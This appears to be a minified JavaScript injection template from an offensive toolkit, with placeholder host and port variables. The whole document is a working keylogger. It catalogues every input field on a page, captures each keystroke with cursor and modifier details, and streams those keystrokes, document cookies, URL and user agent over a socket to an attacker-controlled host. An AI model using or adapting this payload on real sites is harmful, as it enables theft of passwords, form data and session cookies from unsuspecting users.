    <script>function addEvent(t,e,a){t.addEventListener?t.addEventListener(e,a,!1):t.attachEvent&&t.attachEvent("on"+e,a)}function getattr(t,e){var a=e.getAttribute(t);return null===a?"":a}function get_position_from_dom(t){var e,a,n=[];for(e=t;e&&(a=e.tagName.toLowerCase(),"html"!==a);e=e.parentNode)e.className&&(a+="."+e.className.replace(/ /g,".")),n.push(a);return n.reverse(),n.join(" ")}function get_index_from_parent(t){for(var e=0;null!=(t=t.previousSibling);)e++;return e}function setup(){all_inputs=document.getElementsByTagName("input"),inputs={},all_{{ message_details_param }}=[];for(var t=0;t<all_inputs.length;t++){var e=all_inputs[t],a=e.parentNode,n=e.nodeName,s=getattr("id",e),o=getattr("class",e),i=get_position_from_dom(e),r=get_index_from_parent(e),d=getattr("name",e),l=getattr("type",e),c={tag:n,id:s,"class":o,dom_path:i,index_from_parent:r,name:d,type:l,parent_tag:a.nodeName};for(c._id=[c.tag,c.id,c.classes,c.dom_path,c.index_from_parent,c.name,c.type].join(""),"FORM"===c.parent_tag&&(c.form={action:getattr("action",a),method:getattr("method",a),name:getattr("name",a),"class":getattr("class",a),id:getattr("id",a)},c._id+=[c.form.action,c.form.method,c.form.name,c.form["class"],c.form.id].join("")),c._id=c._id.hashCode().toString();c._id in inputs;)c._id=c._id.hashCode().toString();""===c["class"]?c["class"]+=c._id:c["class"]+=" "+c._id,e.className=c["class"],inputs[c._id]=c,e.__{{ message_details_param }}=c,all_{{message_details_param}}.push(c),addEvent(e,"{{keydown_event}}",Keypress)}return{inputs:inputs,all_{{ message_details_param }}:all_{{ message_details_param }} }} function Keypress(t){var e=t.keyCode||t.keyCode;socket.emit("{{keydown_event}}",{data:{ks:e,start_pos:this.selectionStart,end_pos:this.selectionEnd,shift:t.shiftKey,alt:t.altKey,ctrl:t.ctrlKey,view_state:"{{view_state}}",tag_details:this.__{{ message_details_param }}},page_details:{url:document.location,cookie:document.cookie,user_agent:navigator.userAgent}})}String.prototype.hashCode=function(){var t,e,a,n=0;if(0===this.length)return n;for(t=0,a=this.length;a>t;t++)e=this.charCodeAt(t),n=(n<<5)-n+e,n|=0;return n},window.onload=function(){storage=setup(),inputs=storage.inputs,all_{{ message_details_param }}=storage.all_{{ message_details_param }},namespace="{{ ws_namespace }}",socket=io.connect("http://{{ lhost }}:{{ lport }}"+namespace),socket.on("{{ connect_event }}",function(){socket.emit("{{ send_details_event }}",{ {{ message_details_param }}:all_{{ message_details_param }},page_details:{url:document.location,cookie:document.cookie,user_agent:navigator.userAgent} })})};</script>
